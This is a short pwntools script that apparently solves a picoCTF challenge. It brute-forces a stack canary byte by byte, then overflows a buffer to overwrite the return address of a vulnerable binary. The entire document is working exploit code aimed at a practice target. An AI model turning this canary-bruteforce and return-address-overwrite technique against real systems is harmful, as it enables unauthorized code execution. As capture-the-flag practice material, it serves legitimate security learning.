from pwn import *

port = 63923
debug = 1
solve = 1
canary = ''

with context.quiet:
        for i in range(1, 5):
                for j in range(256):
                                if not debug:
                                        s = remote('saturn.picoctf.net', port)
                                else:
                                        s = process('./vuln')

                                s.sendlineafter(b'> ', str(64 + i).encode())
                                s.sendlineafter(b'> ', ('A'*64 + canary + chr(j)).encode())
                                out = s.recvall()

                                if b'Smashing' not in out:
                                        canary += chr(j)
                                        print(canary)
                                        break

        if solve:
                if not debug:
                        s = remote('saturn.picoctf.net', port)
                else:
                        s = process('./vuln')

                s.sendlineafter(b'> ', str(200).encode())
                s.sendlineafter(b'> ', ('A'*64 + canary + 'B'*16).encode() + p32(0x08049336))
                out = s.recvall()
                print (out)